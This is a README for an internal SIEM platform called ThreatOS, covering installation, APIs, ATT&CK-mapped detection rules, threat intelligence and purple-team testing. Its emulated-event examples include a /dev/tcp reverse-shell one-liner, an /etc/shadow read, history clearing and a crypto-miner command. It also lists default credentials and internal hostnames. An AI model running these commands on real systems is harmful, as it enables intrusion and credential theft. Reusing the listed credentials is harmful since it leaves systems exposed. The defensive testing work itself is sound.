# ThreatOS

**MITRE ATT&CK-Aware Security Operations Platform**

ThreatOS is a full-stack Security Information and Event Management (SIEM) platform built for internal infrastructure. It ingests logs from Linux and Windows servers, evaluates every event against 3,044 detection rules mapped to the MITRE ATT&CK framework, generates real-time alerts, and provides a React-based security operations dashboard.

```
Status:   Production (internal network)
Server:   test machine
Version:  0.1.0
Coverage: 100% MITRE ATT&CK (697/697 techniques)
Rules:    3,044 (SigmaHQ + custom)
```

---

## Table of Contents

- [Features](#features)
- [Architecture](#architecture)
- [Tech Stack](#tech-stack)
- [Prerequisites](#prerequisites)
- [Installation](#installation)
- [Configuration](#configuration)
- [Running the Services](#running-the-services)
- [Connecting Log Sources](#connecting-log-sources)
- [API Reference](#api-reference)
- [Detection Rules](#detection-rules)
- [ATT&CK Coverage](#attck-coverage)
- [Threat Intelligence](#threat-intelligence)
- [URL Scanner](#url-scanner)
- [Purple Team Validation](#purple-team-validation)
- [Threat Simulation](#threat-simulation)
- [Security Report](#security-report)
- [Backup and Recovery](#backup-and-recovery)
- [Monitoring](#monitoring)
- [Operational Runbook](#operational-runbook)
- [Credentials](#credentials)

---

## Features

| Feature | Description |
|---|---|
| Real-time detection | Events evaluated against 3,044 rules within seconds |
| MITRE ATT&CK mapping | 100% coverage — 697/697 techniques |
| Risk scoring | Severity × confidence × asset criticality × chain multiplier |
| Attack chain correlation | Groups related alerts into multi-stage campaigns |
| Threat intelligence | VirusTotal + AbuseIPDB enrichment with 24h cache |
| URL Scanner | 11-source URL/domain investigation with copy-paste email report |
| Purple team validation | Proves detection rules actually fire |
| Alert suppression | 15-min dedup window prevents alert storms |
| Audit trail | SHA256 hash chain tamper detection |
| Data retention | Automated cleanup — 90d raw events, 365d alerts |
| JWT auth | Token blacklist, rate limiting, session management |
| Prometheus metrics | 18 metric types, Grafana dashboards |
| PDF reports | Weekly security report with MTTD, MTTR, TI summary |
| Syslog forwarder | Reads system logs and pushes to ingest API |
| Threat simulation | 14 attack scenarios for testing and training |

---

## Architecture

```
Log Sources (Linux / Windows / Network)
         │
         ▼  POST /api/ingest/batch  (X-API-Key)
┌──────────────────────────────────────────────┐
│  FastAPI :8001  (2 uvicorn workers)          │
│  Sanitise → normalise → dedup → persist      │
│  Push to Redis stream                        │
└──────────────────┬───────────────────────────┘
                   │  XREADGROUP
                   ▼
┌──────────────────────────────────────────────┐
│  Ingest Worker                               │
│  Evaluate against 3,044 rules (AST engine)  │
│  Suppress duplicates (15-min window)         │
│  Compute risk_score → persist alert          │
│  Publish to Redis pubsub → WebSocket         │
└──────────────────┬───────────────────────────┘
                   │
                   ▼
┌──────────────────────────────────────────────┐
│  React UI :8080  (served by nginx)           │
│  Dashboard · Alerts · Coverage · Chains      │
│  Purple Team · Threat Intel · Reports        │
└──────────────────────────────────────────────┘

Monitoring (separate server):
  Prometheus :9090  ←  scrapes /metrics every 15s
  Grafana    :3000  ←  reads Prometheus
```

### systemd Services

| Service | Role |
|---|---|
| `threatos-api` | FastAPI application — all HTTP endpoints |
| `threatos-worker` | Redis stream consumer — rule evaluation |
| `threatos-coverage` | Hourly ATT&CK bundle refresh |
| `threatos-retention` | Daily data cleanup |
| `threatos-forwarder` | Syslog forwarder — reads logs, pushes events |
| `threatos-sigma-import.timer` | Daily Sigma rule import at 02:00 |

---

## Tech Stack

| Component | Technology |
|---|---|
| API framework | FastAPI 0.111.0 + uvicorn 0.29.0 |
| Database | PostgreSQL 15 + SQLAlchemy 2.0 (async) + asyncpg |
| Cache / Stream | Redis 5 |
| Migrations | Alembic |
| Auth | python-jose (JWT) + bcrypt 4.0.1 |
| Validation | Pydantic v2 |
| Logging | structlog (JSON in production) |
| Metrics | prometheus-client |
| Reports | ReportLab (PDF) |
| TI | httpx (async) → VirusTotal + AbuseIPDB |
| Frontend | React 18 + TypeScript + Vite |
| Data fetching | TanStack Query v5 |
| Charts | recharts |
| Web server | nginx |
| OS | Oracle Linux 8.x (RHEL 8) |
| Runtime | Python 3.11 |

---

## Prerequisites

```bash
# Required packages
dnf install -y python3.11 python3.11-devel
dnf install -y redis
dnf install -y nginx
dnf install -y nmap
dnf install -y zip unzip
dnf install -y nodejs npm   # for frontend build

# PostgreSQL 15
dnf install -y https://download.postgresql.org/pub/repos/yum/reporpms/EL-8-x86_64/pgdg-redhat-repo-latest.noarch.rpm
dnf -qy module disable postgresql
dnf install -y postgresql15-server postgresql15
/usr/pgsql-15/bin/postgresql-15-setup initdb
systemctl enable --now postgresql-15
```

---

## Installation

```bash
# 1. Clone / extract the project
cd /opt
# unzip threatos_code_YYYYMMDD.zip  (from backup)
# or git clone <repo>

cd /opt/threatos

# 2. Create Python virtualenv
python3.11 -m venv .venv
source .venv/bin/activate
pip install -e .

# 3. Create database
sudo -u postgres psql << 'SQL'
CREATE USER threatos WITH PASSWORD 'threatos_secret';
CREATE DATABASE threatos OWNER threatos;
SQL

# 4. Copy and edit config
cp .env.example .env
nano .env   # fill in secrets (see Configuration section)

# 5. Run database migrations
alembic upgrade head

# 6. Import Sigma detection rules (~2,641 rules)
python scripts/import_sigma_rules.py

# 7. Build the frontend
cd threatos/frontend
npm install
npm run build
cd /opt/threatos

# 8. Install systemd services
cp deploy/systemd/*.service /etc/systemd/system/
cp deploy/systemd/*.timer   /etc/systemd/system/
systemctl daemon-reload

# 9. Configure nginx
cp deploy/nginx/threatos.conf /etc/nginx/conf.d/
nginx -t && systemctl enable --now nginx

# 10. Enable and start all services
systemctl enable --now threatos-api threatos-worker \
  threatos-coverage threatos-retention \
  threatos-sigma-import.timer

# 11. Verify
curl -s http://localhost:8001/health
```

---

## Configuration

All configuration is in `/opt/threatos/.env`.

> ⚠️ Never commit `.env` to version control. Never share JWT secrets.

```bash
# ── Application ──────────────────────────────────────────────────
APP_ENV=production          # development | production
APP_DEBUG=false

# ── Database ─────────────────────────────────────────────────────
DATABASE_URL=postgresql+asyncpg://threatos:PASSWORD@localhost:5432/threatos
DATABASE_POOL_SIZE=10
DATABASE_MAX_OVERFLOW=20

# ── Redis ────────────────────────────────────────────────────────
REDIS_URL=redis://localhost:6379/0
REDIS_STREAM_NAME=threatos:events:normalized
REDIS_CONSUMER_GROUP=detection-workers
REDIS_CONSUMER_NAME=worker-1
WORKER_BATCH_SIZE=500
WORKER_BLOCK_MS=200

# ── JWT — generate with: openssl rand -hex 64 ────────────────────
JWT_SECRET_KEY=<64-char-random-hex>
JWT_REFRESH_SECRET_KEY=<64-char-random-hex>
JWT_ACCESS_EXPIRE_MINUTES=480       # 8 hours
JWT_REFRESH_EXPIRE_DAYS=30

# ── Rate Limiting ────────────────────────────────────────────────
MAX_LOGIN_ATTEMPTS=5
LOGIN_LOCKOUT_MINUTES=15

# ── Admin Bootstrap (first startup only) ────────────────────────
THREATOS_ADMIN_PASSWORD=<change-this>

# ── ATT&CK Bundle ────────────────────────────────────────────────
ATTCK_BUNDLE_URL=https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json

# ── Threat Intelligence ──────────────────────────────────────────
# Get free key: https://www.virustotal.com/gui/my-apikey
VIRUSTOTAL_API_KEY=
# Get free key: https://www.abuseipdb.com/account/api
ABUSEIPDB_API_KEY=
TI_CACHE_HOURS=24
TI_TIMEOUT_SECONDS=10

# ── URL Scanner (all optional — see URL Scanner section) ─────────
# Get free key: https://urlscan.io/user/signup
URLSCAN_API_KEY=
# Get free key: https://auth.abuse.ch/ (required, no longer keyless)
URLHAUS_AUTH_KEY=
# Get free key: https://console.cloud.google.com/apis/library/safebrowsing.googleapis.com
GOOGLE_SAFE_BROWSING_API_KEY=
# Get free key: https://phishtank.org/ (optional — works without one, stricter rate limit)
PHISHTANK_APP_KEY=
# Spamhaus DBL, SURBL, URIBL, SEM-URI, RDAP, SPF/DMARC/DKIM need no key at all.
# All the keys above can also be added/changed from the UI (Threat Intel /
# URL Scanner pages, admin role only) instead of editing this file — see
# "Managing API Keys" under URL Scanner below.

# ── Data Retention (days) ────────────────────────────────────────
RAW_EVENTS_RETENTION_DAYS=90
AUDIT_LOG_RETENTION_DAYS=365
CLOSED_ALERTS_RETENTION_DAYS=365
SCAN_RESULTS_RETENTION_DAYS=180

# ── Health Alert Thresholds ──────────────────────────────────────
ALERT_WORKER_LAG=1000
ALERT_NO_EVENTS_HOURS=2
ALERT_MIN_RULES=100

# ── Syslog Forwarder ─────────────────────────────────────────────
THREATOS_API_KEY=<ingest-api-key>
THREATOS_URL=http://localhost:8001
```

### Generate JWT secrets:
```bash
openssl rand -hex 64   # run twice — one for each secret
```

### Generate admin password hash:
```bash
python3 -c "import bcrypt; print(bcrypt.hashpw(b'YourPassword', bcrypt.gensalt()).decode())"
```

---

## Running the Services

```bash
# Start all
systemctl start threatos-api threatos-worker \
  threatos-coverage threatos-retention threatos-forwarder

# Stop all
systemctl stop threatos-api threatos-worker \
  threatos-coverage threatos-retention threatos-forwarder

# Restart all
systemctl restart threatos-api threatos-worker \
  threatos-coverage threatos-retention threatos-forwarder

# Check status
systemctl status threatos-api threatos-worker \
  threatos-coverage threatos-retention --no-pager

# View logs
journalctl -u threatos-api      -f    # API logs
journalctl -u threatos-worker   -f    # Worker logs
journalctl -u threatos-coverage -f    # Coverage logs
journalctl -u threatos-forwarder -f   # Forwarder logs
```

---

## Connecting Log Sources

### Linux Server

Install the syslog forwarder on each Linux server you want to monitor:

```bash
# Copy the forwarder script to the target server
scp /opt/threatos/scripts/syslog_forwarder.py root@TARGET_SERVER:/opt/

# On the target server — create the systemd service
cat > /etc/systemd/system/threatos-forwarder.service << 'EOF'
[Unit]
Description=ThreatOS Syslog Forwarder
After=network.target

[Service]
Type=exec
Environment="THREATOS_URL=http://test06.hyd.int.untd.com:8001"
Environment="THREATOS_API_KEY=YOUR_INGEST_API_KEY"
ExecStart=/usr/bin/python3 /opt/syslog_forwarder.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable --now threatos-forwarder
```

**Log files watched by default:**

| File | log_source | Events |
|---|---|---|
| `/var/log/authlog` or `/var/log/secure` | `syslog-auth` | SSH, sudo, PAM |
| `/var/log/messages` | `syslog` | System events |
| `/var/log/cron` | `syslog-cron` | Cron jobs |
| `/var/log/audit/audit.log` | `syslog-audit` | Auditd events |
| `/var/log/nginx/access.log` | `nginx` | Web access |

> Note: Oracle Linux / RHEL systems may use `/var/log/authlog` instead of `/var/log/secure`. The forwarder checks both.

### Windows Server (Future)

Option A — NXLog agent:
```xml
<!-- nxlog.conf -->
<Output threatos>
    Module  om_http
    URL     http://test06.hyd.int.untd.com:8001/api/ingest/batch
    AddHeader X-API-Key YOUR_INGEST_API_KEY
</Output>
```

Option B — Windows Event Forwarding (WEF):
```
1. Configure WEC (Windows Event Collector) on a central server
2. Subscribe to Security, System, Application channels
3. Forward from WEC to ThreatOS /api/ingest/batch
```

Windows Sigma rules (2,641 imported) activate automatically when Windows events arrive.

### Generate Ingest API Key

```bash
# Login and get admin token
TOKEN=$(curl -s -X POST http://localhost:8001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"YOUR_PASSWORD"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Get admin user ID
ADMIN_ID=$(curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/auth/users | \
  python3 -c "import json,sys
users=json.load(sys.stdin)
print([u['id'] for u in users if u['username']=='admin'][0])")

# Generate API key
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/auth/users/$ADMIN_ID/generate-api-key"
```

---

## API Reference

**Base URL:** `http://YOUR_SERVER:8001`  
**Interactive docs:** `http://YOUR_SERVER:8001/docs`  
**Auth:** `Authorization: Bearer <token>` or `X-API-Key: <key>` (ingest only)

### Quick Reference

```bash
# Login
POST /api/auth/login
{"username":"admin","password":"..."}
→ {"access_token":"...","refresh_token":"..."}

# List open alerts
GET /api/alerts?status=open
Authorization: Bearer <token>

# Ingest event (API key auth)
POST /api/ingest/event
X-API-Key: <key>
{"payload":{...},"fmt":"syslog-auth"}

# Ingest batch (up to 500 events)
POST /api/ingest/batch
X-API-Key: <key>
[{"payload":{...},"fmt":"syslog"},...]

# Coverage summary
GET /api/coverage/summary

# TI lookup
POST /api/ti/enrich
{"ioc_value":"1.2.3.4","ioc_type":"ip"}

# URL Scanner investigation (returns per-source results + copy-paste report)
POST /api/url-intel/investigate
{"url":"https://suspicious-site.example/login"}

# Download PDF report
GET /api/report/pdf?days=7

# Health check (no auth)
GET /health

# Prometheus metrics (no auth)
GET /metrics
```

### All Route Groups

| Group | Prefix | Auth |
|---|---|---|
| Auth | `/api/auth` | JWT |
| Alerts | `/api/alerts` | JWT |
| Rules | `/api/rules` | JWT |
| Assets | `/api/assets` | JWT |
| Chains | `/api/chains` | JWT |
| Coverage | `/api/coverage` | JWT |
| Detection Quality | `/api/detection` | JWT |
| Events | `/api/events` | JWT |
| Ingest | `/api/ingest` | API Key |
| Compliance | `/api/compliance` | JWT |
| Reports | `/api/report` | JWT |
| Retention | `/api/retention` | JWT |
| Scans | `/api/scans` | JWT |
| Purple Team | `/api/purple` | JWT |
| Threat Intel | `/api/ti` | JWT |
| URL Scanner | `/api/url-intel` | JWT |
| Settings (API keys) | `/api/settings` | JWT (admin) |
| Audit | `/api/audit` | JWT |
| Health | `/health` | None |
| Metrics | `/metrics` | None |
| WebSocket | `/ws/alerts` | None |

---

## Detection Rules

### Rule Structure

Each rule has a `detection_ast` — a JSON condition tree:

```json
{
  "name": "[Custom] SSH Failed Password",
  "technique_id": "T1110.001",
  "tactic": "credential-access",
  "severity": 7,
  "confidence": 0.85,
  "log_sources": ["syslog-auth"],
  "detection_ast": {
    "type": "and",
    "children": [
      {"type":"field_match","field":"process","operator":"contains","value":"sshd"},
      {"type":"field_match","field":"command_line","operator":"contains","value":"Failed password"}
    ]
  }
}
```

### Supported operators
`equals` · `not_equals` · `contains` · `not_contains` · `starts_with` · `ends_with` · `regex` · `exists` · `gt` · `lt`

### Available event fields
`log_source` · `host` · `user` · `process` · `command_line` · `parent_process` · `src_ip` · `dst_ip` · `dst_port` · `file_path` · `file_hash` · `logon_type` · `auth_result` · `message` · `event_id`

### Create a custom rule
```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8001/api/rules \
  -d '{
    "name": "[Custom] My Detection Rule",
    "technique_id": "T1059.004",
    "tactic": "execution",
    "severity": 8,
    "confidence": 0.9,
    "log_sources": ["syslog"],
    "detection_ast": {
      "type": "field_match",
      "field": "command_line",
      "operator": "contains",
      "value": "suspicious_string"
    }
  }'
```

### Import latest Sigma rules
```bash
cd /opt/threatos && source .venv/bin/activate
python scripts/import_sigma_rules.py
# Also runs automatically at 02:00 via threatos-sigma-import.timer
```

---

## ATT&CK Coverage

```
Current: 697/697 techniques (100%)
Tactics: 14 (all at 100% or near-100%)
```

### Check coverage
```bash
# Summary
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/coverage/summary

# Full matrix
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/coverage

# Gaps only (techniques with no rules)
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/coverage?tactic=execution" | python3 -c "
import json,sys
gaps=[r for r in json.load(sys.stdin) if not r['covered']]
for r in gaps: print(r['technique_id'], r['technique_name'])"
```

### Refresh coverage after adding rules
```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/coverage/refresh
```

---

## Threat Intelligence

### Setup
Add API keys to `.env`:
```bash
VIRUSTOTAL_API_KEY=your-key   # https://www.virustotal.com/gui/my-apikey
ABUSEIPDB_API_KEY=your-key    # https://www.abuseipdb.com/account/api
```

Free tier limits:
- VirusTotal: 4 requests/minute, 500/day
- AbuseIPDB: 1,000 requests/day

### Usage
```bash
# Lookup a single IOC
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8001/api/ti/enrich \
  -d '{"ioc_value":"1.2.3.4","ioc_type":"ip"}'

# Enrich all IOCs from a specific alert
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/ti/enrich-alert/ALERT_ID

# Bulk enrich top open alerts (weekly task)
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/ti/enrich-open-alerts?limit=20"

# View TI cache stats
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/ti/stats
```

### Verdicts
| Verdict | Meaning | Action |
|---|---|---|
| `malicious` | VT ≥3 engines OR AbuseIPDB ≥80% | Block at firewall, escalate |
| `suspicious` | VT ≥1 engine OR AbuseIPDB ≥25% | Investigate further |
| `clean` | All sources clean | Lower priority |
| `unknown` | Not in any database | Check logs for context |
| `no_api_key` | Key not configured | Add key to .env |

---

## URL Scanner

Investigates a single URL/domain against 11 sources and produces a plain-text
investigation report meant to be copied straight into an email reply to
whoever reported the link. Standalone tool — separate from the alert-IOC
enrichment above, used for one-off "is this link safe" investigations.

### Sources

| Source | Key required | Notes |
|---|---|---|
| VirusTotal | `VIRUSTOTAL_API_KEY` (shared with Threat Intelligence) | URL scan, submits if never seen before |
| urlscan.io | Optional (`URLSCAN_API_KEY`) | Live scan: screenshot, redirect chain, landing IP/ASN. No key → scan is public/searchable on urlscan.io |
| Spamhaus DBL | None | Free DNS blocklist lookup |
| SURBL | None | Free DNS blocklist lookup (listed/not-listed only) |
| URIBL | None | Free DNS blocklist lookup; rate-limit responses treated as inconclusive, not malicious |
| SEM-URI | None | Free DNS blocklist lookup (Spam Eating Monkey) |
| URLhaus | Required (`URLHAUS_AUTH_KEY`) | abuse.ch malware-distribution URL database |
| RDAP domain age | None | Domains registered <30 days ago are flagged suspicious |
| Google Safe Browsing | Optional (`GOOGLE_SAFE_BROWSING_API_KEY`) | Same blocklist Chrome/Firefox use |
| PhishTank | Optional (`PHISHTANK_APP_KEY`) | Community phishing-URL database |
| SPF/DMARC/DKIM | None | Missing SPF+DMARC, or DMARC `p=none`, flags the domain as easy to spoof |

### Usage
```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8001/api/url-intel/investigate \
  -d '{"url":"https://suspicious-site.example/login"}'

# Past investigations (report_text included, no re-scan needed)
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/url-intel/history

# Which optional keys are configured
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/url-intel/stats
```

The UI (URL Scanner page) shows per-source results plus the generated
report in a panel with **Copy to Clipboard**, **Download .txt**, and a
**mailto:** button.

### Managing API Keys
Admin users can add or change `VIRUSTOTAL_API_KEY`, `ABUSEIPDB_API_KEY`,
`URLSCAN_API_KEY`, `URLHAUS_AUTH_KEY`, `GOOGLE_SAFE_BROWSING_API_KEY`, and
`PHISHTANK_APP_KEY` directly from the Threat Intel / URL Scanner pages —
click "Add"/"Change" next to a source's status card. Saving applies the
key immediately (no restart) and persists it to `.env` for future
restarts. Every other role sees the same status cards read-only.

### Investigation History
Every investigation is saved (`url_investigations` table) — the
Investigation History table on the URL Scanner page lists past scans with
a "View Report" button that re-displays the saved report instantly,
without re-querying any external source.

---

## Purple Team Validation

Test whether your detection rules actually fire against specific attack techniques.

```bash
# Validate T1003.008 — /etc/shadow read
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8001/api/purple/validate \
  -d '{
    "technique_id": "T1003.008",
    "emulated_event": {
      "process": "cat",
      "command_line": "cat /etc/shadow",
      "log_source": "syslog-auth"
    }
  }'

# Response:
# {
#   "verdict": "pass",
#   "detection_rate": 100.0,
#   "rules_fired": ["d8d727b4-..."],
#   "rules_missed": []
# }
```

### Common emulated events

| Technique | Emulated Event |
|---|---|
| T1110.001 SSH brute force | `{"process":"sshd","command_line":"Failed password for root from 1.2.3.4 port 22 ssh2","log_source":"syslog-auth"}` |
| T1059.004 Bash shell | `{"process":"bash","command_line":"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1","log_source":"syslog"}` |
| T1548.003 Sudo abuse | `{"process":"sudo","command_line":"sudo /bin/bash","log_source":"syslog-auth"}` |
| T1562.003 History clear | `{"process":"bash","command_line":"export HISTFILE=/dev/null","log_source":"syslog"}` |
| T1496.001 Cryptomining | `{"process":"xmrig","command_line":"/tmp/xmrig -o stratum+tcp://pool.minexmr.com:443","log_source":"syslog"}` |

The UI Purple Team page has 27 techniques with pre-populated scenarios — select a technique ID and choose from the dropdown.

---

## Threat Simulation

Push realistic attack events to test detection end-to-end.

```bash
cd /opt/threatos && source .venv/bin/activate

# List all scenarios
python scripts/simulate_threats.py --list

# Run specific scenario against a host
python scripts/simulate_threats.py \
  --scenario ssh_bruteforce \
  --host myserver.domain.com

# Run full Linux kill chain
python scripts/simulate_threats.py \
  --scenario full_linux_attack \
  --host myserver.domain.com

# Run all scenarios
python scripts/simulate_threats.py --host myserver.domain.com
```

### Available Scenarios

| Key | Scenario | Tactics Covered |
|---|---|---|
| `linux_recon` | Linux Reconnaissance | discovery |
| `linux_privesc` | Privilege Escalation via sudo | privilege-escalation |
| `linux_persistence` | Cron / bashrc / SSH key persistence | persistence |
| `linux_credential_access` | /etc/shadow, /proc, SSH keys | credential-access |
| `linux_lateral_movement` | SSH with stolen keys | lateral-movement |
| `linux_defense_evasion` | Log clearing, auditd disable | defense-evasion |
| `linux_exfiltration` | curl, scp, DNS, webhook | exfiltration |
| `linux_cryptomining` | XMRig deployment | impact |
| `linux_webshell` | PHP web shell via nginx | persistence |
| `ssh_bruteforce` | SSH password brute force | credential-access |
| `sudo_abuse` | GTFOBins sudo abuse | privilege-escalation |
| `full_linux_attack` | **Complete kill chain** (SSH→recon→privesc→persist→lateral→exfil) | multiple |
| `rdp_bruteforce` | Windows RDP brute force | credential-access |
| `psexec` | Windows PSExec lateral movement | lateral-movement |

---

## Security Report

Generate PDF or JSON security reports covering:
- Security status verdict (CRITICAL / WARNING / NORMAL)
- Alert summary with risk distribution
- MTTD (Mean Time to Detect) and MTTR (Mean Time to Respond)
- Threat intelligence enrichment summary
- Confirmed malicious IOCs
- Critical assets at risk
- Top detected ATT&CK techniques
- Attack chain correlation
- Detection quality (noisy rules)
- Compliance summary
- Auto-generated recommendations

```bash
# JSON report (used by UI)
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/report/data?days=7"

# PDF download
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/report/pdf?days=7" \
  -o security_report_$(date +%Y%m%d).pdf
```

Available periods: `days=1` `days=7` `days=14` `days=30` `days=90`

---

## Backup and Recovery

### ThreatOS Backup
```bash
# Manual backup
bash /opt/threatos/scripts/backup_threatos.sh

# Set up daily cron (runs at 01:00)
echo "0 1 * * * bash /opt/threatos/scripts/backup_threatos.sh >> /var/log/backup-threatos.log 2>&1" | crontab -
```

Output in `/backup/threatos/`:
- `threatos_db_YYYYMMDD_HHMM.sql.gz` — PostgreSQL dump
- `threatos_code_YYYYMMDD.zip` — source code (no .venv or .env)
- `threatos_configs_YYYYMMDD.zip` — .env + nginx + systemd (chmod 600)
- `threatos_frontend_dist_YYYYMMDD.zip` — built React UI

Retention: 7 days automatic cleanup.

### FIM Backup
```bash
bash /opt/fim/backup_fim.sh
echo "0 2 * * * bash /opt/fim/backup_fim.sh >> /var/log/backup-fim.log 2>&1" | crontab -
```

### Database Restore
```bash
# Restore ThreatOS database
gunzip -c /backup/threatos/threatos_db_YYYYMMDD.sql.gz | \
  PGPASSWORD=threatos_secret psql -h localhost -U threatos -d threatos
```

---

## Monitoring

### Prometheus + Grafana (running on test05)

```
Prometheus:  http://test05:9090
Grafana:     http://test05:3000  (admin / admin)
Scrape URL:  http://10.103.32.224:8001/metrics  (every 15s)
```

### Key metrics

```
threatos_rules_loaded_total          # Should match rules_enabled_total
threatos_attck_coverage_percent      # Should be 100.0
threatos_alerts_by_status{status}    # open count — alert if > 0
threatos_worker_lag_events           # Should be near 0
threatos_db_pool_checked_out         # Watch for pool exhaustion
threatos_http_request_duration_seconds  # API latency
```

### Health endpoint
```bash
# Basic health (no auth)
curl -s http://localhost:8001/health

# Full status with health alerts (auth required)
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/health/status
```

### Health alert thresholds
| Check | Threshold | Severity |
|---|---|---|
| Worker lag | > 1000 events | CRITICAL |
| No events | > 2 hours | WARNING |
| Rules loaded | < 100 | CRITICAL |
| Engine empty | 0 rules | CRITICAL |
| ATT&CK cache | empty | WARNING |
| Coverage drop | > 10% | WARNING |

---

## Operational Runbook

### Daily (5 minutes)
```bash
# 1. Check all services
for svc in postgresql-15 redis nginx threatos-api \
           threatos-worker threatos-forwarder; do
    echo "$(systemctl is-active $svc) — $svc"
done

# 2. Health check
curl -s http://localhost:8001/health | python3 -c "
import json,sys; d=json.load(sys.stdin)
print(f'Status: {d[\"status\"]}  Rules: {d[\"rules_loaded\"]}')"

# 3. Check open alerts (get token first)
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/alerts?status=open" | python3 -c "
import json,sys; a=json.load(sys.stdin)
print(f'Open: {len(a)}')
for x in sorted(a,key=lambda x:x['risk_score'],reverse=True)[:5]:
    print(f'  [{x[\"risk_score\"]:5.1f}] {x[\"technique_id\"]} {x[\"entity_host\"]}')"
```

### Weekly (30 minutes)
```bash
# Review noisy rules
curl -s -H "Authorization: Bearer $TOKEN" \
  http://localhost:8001/api/detection/noisy-rules

# Enrich open alerts with TI
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/ti/enrich-open-alerts?limit=20"

# Run threat simulation
python scripts/simulate_threats.py \
  --scenario full_linux_attack \
  --host test06.hyd.int.untd.com

# Download weekly PDF report
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8001/api/report/pdf?days=7" -o weekly_report.pdf

# Verify backup
ls -lh /backup/threatos/ | tail -5
```

### Alert Risk Triage
| Score | Priority | Action |
|---|---|---|
| 80–100 | Critical | Investigate immediately |
| 60–79 | High | Review within 24 hours |
| 40–59 | Medium | Review this week |
| 0–39 | Low | Background noise |

### Multi-stage Chain Response
1. Note host and tactics
2. Extend window: `POST /api/chains/correlate {"host":"HOST","window_hours":72}`
3. Search raw events: `GET /api/events/search?host=HOST`
4. Enrich IOCs: `POST /api/ti/enrich-alert/{id}`
5. Update status to `investigating`
6. Escalate if multi-stage AND risk > 80

---

## Credentials

> ⚠️ Change all default credentials before connecting to the network.

| Service | Credential |
|---|---|
| UI / API admin | `admin` / `ThreatOS@2026` — **CHANGE THIS** |
| PostgreSQL | `threatos` / `threatos_secret` @ localhost:5432/threatos |
| JWT secrets | In `/opt/threatos/.env` |
| Ingest API key | In `/opt/threatos/.env` as `THREATOS_API_KEY` |
| Grafana | `admin` / `admin` on test05:3000 |

### Change admin password
```bash
TOKEN=$(curl -s -X POST http://localhost:8001/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"ThreatOS@2026"}' | \
  python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  http://localhost:8001/api/auth/change-password \
  -d '{"current_password":"ThreatOS@2026","new_password":"YourNewPassword"}'
```

---

## File Locations

```
/opt/threatos/                              Project root
/opt/threatos/.env                          Configuration (secrets)
/opt/threatos/.venv/                        Python virtualenv
/opt/threatos/alembic.ini                   DB migration config
/opt/threatos/threatos/main.py              FastAPI application
/opt/threatos/threatos/api/routers/         API route handlers (18 modules)
/opt/threatos/threatos/services/            Business logic
/opt/threatos/threatos/workers/             Background workers
/opt/threatos/threatos/models/              SQLAlchemy ORM models
/opt/threatos/threatos/detection/           Rule engine + AST evaluator
/opt/threatos/threatos/ingestion/           Event normalisation
/opt/threatos/threatos/core/                Auth, DB, Redis, metrics, logging
/opt/threatos/threatos/frontend/dist/       Built React UI (served by nginx)
/opt/threatos/scripts/simulate_threats.py   Threat simulation
/opt/threatos/scripts/syslog_forwarder.py   Log ingestion agent
/opt/threatos/scripts/import_sigma_rules.py Sigma rule importer
/opt/threatos/scripts/backup_threatos.sh    ThreatOS backup script

/etc/systemd/system/threatos-*.service     systemd service files
/etc/nginx/conf.d/threatos.conf            nginx configuration
/var/lib/threatos-forwarder/state.json     Forwarder read position state
/var/log/backup-threatos.log               Backup log

/backup/threatos/                          Backup output directory
```

---

## URLs

| URL | Purpose |
|---|---|
| `http://SERVER:8080` | Web UI |
| `http://SERVER:8001/docs` | Interactive API documentation |
| `http://SERVER:8001/health` | Health check (no auth) |
| `http://SERVER:8001/health/status` | Full status with health alerts |
| `http://SERVER:8001/metrics` | Prometheus metrics scrape |
| `ws://SERVER:8001/ws/alerts` | Real-time WebSocket alerts |

---

## Known Limitations

- **Redis 5** — XAUTOCLAIM command not supported (added in Redis 6.2). Worker falls back gracefully with a warning. Upgrade Redis to 6.2+ to enable crash recovery.
- **Windows log sources** — Windows Event Forwarding not yet configured. Sigma Windows rules are loaded and ready — they activate when Windows events start flowing.
- **HTTPS** — not yet configured. Request certificate from IT team for production use.
- **Single server** — all components run on one server. Can be split for scale.
- **Purple Team partials** — Sigma rules imported from SigmaHQ are Windows-focused. Linux custom rules pass 100%. Partial verdicts on Linux techniques are expected for the Sigma rules portion.

---

## License

Internal use only.  
Not for distribution outside the organisation.

---

*ThreatOS — Built by IT Infrastructure, April 2026*
